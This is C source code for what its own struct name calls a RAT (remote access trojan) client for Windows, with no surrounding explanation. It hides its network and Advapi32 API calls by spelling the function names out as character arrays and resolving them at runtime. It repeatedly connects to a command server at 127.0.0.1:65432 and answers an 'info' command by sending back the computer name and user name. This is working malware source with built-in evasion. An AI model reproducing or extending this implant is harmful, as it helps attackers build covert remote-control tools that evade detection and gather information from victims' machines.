#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <string.h>

// Ws2_32.dll definitions
typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
typedef int WSAAPI _connect(SOCKET s, const sockaddr *name, int namelen);
typedef int WSAAPI _send(SOCKET s, const char *buf, int len, int flags);
typedef int WSAAPI _closesocket(SOCKET s);
typedef u_short _htons(u_short hostshort);
typedef unsigned long WSAAPI _inet_addr(const char *cp);
typedef int WSAAPI _WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef int _WSACleanup();
typedef int WSAAPI _WSAGetLastError();
typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);

#define SOCKET_BUFFER_SIZE 256
#define UNLEN 256

struct RATSocket
{
	HMODULE libraryWinsock2;
	SOCKET socketConnection;
	_WSAGetLastError *f_WSAGetLastError;	
};

int SocketSend(RATSocket* ratSocket, char* messageBuffer)
{
	char ca_send[] = { 's','e','n','d', 0};
	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
	if ( f_send(ratSocket->socketConnection, messageBuffer, (int)strlen(messageBuffer), 0) == SOCKET_ERROR )
	{
		char buffer[256];
		sprintf(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
		OutputDebugStringA(buffer);
		return 1;
	}
	return 0;
}

int CALLBACK
WinMain(HINSTANCE hInstance,
		HINSTANCE hPrevInstance,
		LPSTR lpCmdLine,
		int nCmdShow)
{
	RATSocket ratSocket = {};
	
	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
	ratSocket.libraryWinsock2 = LoadLibraryA(ca_ws2_32);
	if ( !ratSocket.libraryWinsock2 )
	{
		OutputDebugStringA("Loading ratSocket.libraryWinsock2 failed.\n");
		return 1;
	}

	char ca_WSAGetLastError[] = { 'W','S','A','G','e','t','L','a','s','t','E','r','r','o','r', 0 };
	char ca_WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	ratSocket.f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAGetLastError);
	
	while(true)
	{
		WSADATA wsaData;

		_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAStartup);
		if ( f_WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR )
		{
			OutputDebugStringA("WSAStartup failed.\n");
			return 1;
		}

		char ca_socket[] = { 's','o','c','k','e','t',0 };
		_socket* f_socket = (_socket*)GetProcAddress(ratSocket.libraryWinsock2, ca_socket);

		ratSocket.socketConnection = f_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if ( ratSocket.socketConnection == INVALID_SOCKET )
		{	
			char buffer[256];
			sprintf(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			return 1;
		}

		char ca_htons[] = { 'h','t','o','n','s',0 };
		char ca_inet_addr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	
		_htons* f_htons = (_htons*)GetProcAddress(ratSocket.libraryWinsock2, ca_htons);
		_inet_addr* f_inet_addr = (_inet_addr*)GetProcAddress(ratSocket.libraryWinsock2, ca_inet_addr);

		char ca_ip_addr[] = { '1','2','7','.','0','.','0','.','1', 0 };
	
		struct sockaddr_in socketAddress;
		socketAddress.sin_family = AF_INET;
		socketAddress.sin_port = f_htons(65432);
		socketAddress.sin_addr.s_addr = f_inet_addr(ca_ip_addr);

		char ca_connect[] = { 'c','o','n','n','e','c','t', 0};
		_connect* f_connect = (_connect*)GetProcAddress(ratSocket.libraryWinsock2, ca_connect);

		if ( f_connect(ratSocket.socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) != SOCKET_ERROR )
		{
			OutputDebugStringA("Connection successful!\n");
			break;
		}
		else
		{
			char buffer[256];
			sprintf(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);

			// Try to reconnect
			// 
			char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
			_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
			f_closesocket(ratSocket.socketConnection);

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			
			Sleep(10000);
		}
	}

	SocketSend(&ratSocket, "login");

	char ca_recv[] = { 'r','e','c','v', 0 };
	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);

	while(1)
	{
		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
		if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
		{
			OutputDebugStringA("Error receiving message.");
		}
		
		OutputDebugStringA("Received command: ");
		char ca_info[] = { 'i','n','f','o',0 };
		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
		if ( strcmp(recvBuffer, ca_info) == 0 )
		{
			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
			if ( !libraryAdvapi32 )
			{
				OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
				return 1;
			}

			char ca_GetUsernameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUsernameA);

			char bufferError[256];
			char bufferUser[UNLEN + 1];
			DWORD len = sizeof(bufferUser);

			char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
			len = sizeof(bufferComputer);
			if ( GetComputerNameA(bufferComputer, &len) <= 0 )
			{
				sprintf(bufferError, "Could not get computer name: %ld\n", GetLastError());
				OutputDebugStringA(bufferError);

				strncpy(bufferComputer, ca_unknown, sizeof(ca_unknown));
			}

			if ( f_GetUserNameA(bufferUser, &len) <= 0 )
			{
				sprintf(bufferError, "Could not get username: %ld\n", GetLastError());
				OutputDebugStringA(bufferError);

				strncpy(bufferUser, ca_unknown, sizeof(ca_unknown));
			}

			char bufferInfo[256];
			sprintf(bufferInfo, "%s:%s", bufferComputer, bufferUser);
			SocketSend(&ratSocket, bufferInfo);
		}
		else if ( strcmp(recvBuffer, ca_shutdown) == 0 )
		{
			OutputDebugStringA("Received shutdown command.\n");
			break;
		}
		else
		{
			OutputDebugStringA("[WARNING] Unrecognized command: ");
			OutputDebugStringA(recvBuffer);
			OutputDebugStringA("\n");
			
			break;
		}
		OutputDebugStringA("\n");
		Sleep(3000);
	}

	OutputDebugStringA("Shutting down...");	
	
	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
	f_closesocket(ratSocket.socketConnection);

	char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
	_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
	f_WSACleanup();
	
	return 0;
}
